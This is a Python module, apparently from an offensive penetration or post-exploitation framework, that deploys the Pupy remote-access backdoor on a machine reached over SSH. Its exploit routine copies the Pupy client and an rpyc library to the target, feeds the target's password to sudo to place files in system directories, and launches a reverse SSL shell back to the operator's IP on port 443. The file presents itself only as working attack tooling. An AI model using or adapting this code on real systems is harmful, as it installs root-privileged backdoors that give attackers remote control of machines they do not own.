from module import *
import os
import cmd
from colorama import *
from definitions import *

class Pupy(Module):
    prompt = Fore.RED + "(pupy) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Pupy module"
        self.target = target
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }
    
    def check_valid(self):
        return True
    
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None

        
    def do_exploit(self, args):
        port = self.get_value("port")
        
        self.target.ssh.exec_command('rm -r pupy')
        self.target.scpFiles(self, 'pupy', True)
        self.target.scpFiles(self, '/usr/local/lib/python2.7/dist-packages/rpyc', True)
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
        raw_input("Please navigate to the pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S python pupy/client/reverse_ssl.py " + self.core.localIP + ":443")
        raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")


